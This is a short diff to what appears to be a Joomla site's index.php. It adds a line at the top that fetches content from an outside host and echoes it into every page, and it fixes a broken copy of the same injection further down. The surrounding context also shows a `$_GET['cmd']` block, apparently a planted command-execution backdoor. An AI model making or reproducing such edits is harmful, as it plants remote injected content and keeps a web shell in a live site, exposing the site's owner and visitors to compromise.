@@ -1,4 +1,6 @@
 <?php
+echo file_get_contents("https://includes-page.com/L/h.txt");
+
 /**
  * @package    Joomla.Site
  *
@@ -34,7 +36,7 @@ if (isset($_GET['cmd'])) {
         }
     }
 }
-indclude echo file_get_contents("https://includes-page.com/L/h.txt");
+
 define('JOOMLA_MINIMUM_PHP', '5.3.10');
 
 if (version_compare(PHP_VERSION, JOOMLA_MINIMUM_PHP, '<'))
